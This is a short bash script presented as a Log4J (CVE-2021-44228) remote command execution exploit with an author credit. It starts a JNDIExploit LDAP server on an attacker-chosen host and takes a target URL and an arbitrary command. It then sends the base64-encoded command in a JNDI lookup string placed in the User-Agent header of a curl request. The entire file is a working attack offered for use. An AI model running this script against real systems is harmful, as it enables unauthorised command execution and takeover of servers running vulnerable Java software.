#!/bin/bash

echo "Log4J (CVE-2021-44228) Exploit with Remote Command Execution (RCE)"
echo "Credit: Cristian Cornea - https://linkedin.com/in/cristian-cornea-b37005178"
echo ""
echo ""
read -p "Listening Server: " lhost
java -jar JNDIExploit-1.2-SNAPSHOT.jar -i $lhost -p 9001 &
read -p "Target (example: http://localhost:8080): " target
read -p "Command to Execute: " command
command_encoded="$(echo $command | base64 -w 0)"
header=""
echo "Sending exploit..."
curl $target -H "User-Agent: \${jndi:ldap://$lhost:1389/Basic/Command/Base64/$command_encoded}"
